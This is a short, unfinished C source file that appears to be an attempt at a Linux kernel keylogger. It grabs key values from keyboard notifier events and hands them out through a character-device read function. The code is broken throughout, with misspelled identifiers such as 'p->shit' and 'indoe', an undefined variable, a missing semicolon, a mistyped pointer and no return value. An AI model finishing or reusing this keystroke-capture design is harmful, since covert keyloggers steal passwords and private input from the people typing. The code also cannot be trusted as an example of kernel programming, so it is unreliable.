#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/kernel.h>
#include <unistd.h>
#include <linux/fs.h>
static char *msg_Ptr='0';
void update_key(struct keyboard_notifier_param p)
{
    if (p->shit){
        /*hundle as shift*/
    }
    else
    {
        *msg_Ptr= p->value;
    }
    
}
static int device_open(struct indoe *indoe, struct file *file)
{
    static int counter =0;
    if (Device_open) return -EBUSY;
    device_open++
}
static size_t device_read(struct file *filp, char *buffer, size_t length, __loff_t *offset)
{
    int bytes_read=0;
    if (*msg_Ptr ==0) return 0;
    while (length && *msg_Ptr){
        put_user(*(msg_Ptr++), buffer++);
        length--;
        bytes_read++;
    }
}